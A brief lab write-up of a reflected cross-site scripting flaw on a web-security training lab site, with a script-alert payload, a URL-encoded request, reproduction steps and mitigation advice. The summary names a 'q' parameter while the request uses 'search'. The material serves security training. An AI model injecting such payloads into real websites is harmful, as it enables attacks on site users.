# Reflected XSS — Example (lab)
**Target:** (https://0abe0041033a37d680520380001200fe.web-security-academy.net/?search)
**Date:** 2025-11-01
**Author:** BIGHACK

## Summary
Reflected XSS in the `q` parameter. Payload: `<script>alert(1)</script>`.

## Steps to reproduce
1. Visit:
(https://0abe0041033a37d680520380001200fe.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E)
2. Observe the alert popup.

## Raw request
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2
Host: 0abe0041033a37d680520380001200fe.web-security-academy.net

## PoC
- ![PoC screenshot](images/poc1.png)
## Mitigation
- HTML-encode output; use CSP; validate input.
